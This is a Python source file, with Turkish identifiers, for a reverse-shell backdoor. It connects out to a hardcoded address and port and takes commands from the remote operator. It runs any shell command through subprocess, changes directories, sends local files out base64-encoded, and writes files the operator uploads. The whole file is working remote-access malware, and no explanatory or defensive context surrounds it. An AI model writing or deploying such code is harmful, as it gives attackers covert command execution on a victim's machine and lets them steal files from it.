import socket
import subprocess
import simplejson
import os
import base64

class SoketBaglanti:
    def __init__(self, ip, port):
        self.baglanti = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.baglanti.connect((ip, port))

    def komut_calistir(self, komut):
        return subprocess.check_output(komut, shell=True)

    def json_gonder(self, veri):
        json_veri = simplejson.dumps(veri)
        self.baglanti.send(json_veri.encode("utf-8"))

    def json_al(self):
        json_veri = ""
        while True:
            try:
                json_veri = json_veri + self.baglanti.recv(1024).decode()
                return simplejson.loads(json_veri)
            except ValueError:
                continue

    def dizin_degistir(self, dizin):
        os.chdir(dizin)
        return dizin + " dizinine geçildi."

    def dosya_icerigi_al(self, yol):
        with open(yol, "rb") as dosya:
            return base64.b64encode(dosya.read())

    def dosya_kaydet(self, yol, icerik):
        with open(yol, "wb") as dosya:
            dosya.write(base64.b64decode(icerik))
            return "Indirme başarılı"

    def baglanti_baslat(self):
        while True:
            komut = self.json_al()
            try:
                if komut[0] == "cikis":
                    self.baglanti.close()
                    exit()
                elif komut[0] == "cd" and len(komut) > 1:
                    sonuc = self.dizin_degistir(komut[1])
                elif komut[0] == "indir":
                    sonuc = self.dosya_icerigi_al(komut[1])
                elif komut[0] == "yukle":
                    sonuc = self.dosya_kaydet(komut[1], komut[2])
                else:
                    sonuc = self.komut_calistir(komut)
            except Exception:
                sonuc = "Hata!"
            self.json_gonder(sonuc)

baglanti_nesnesi = SoketBaglanti("192.168.1.108", 8080)
baglanti_nesnesi.baglanti_baslat()
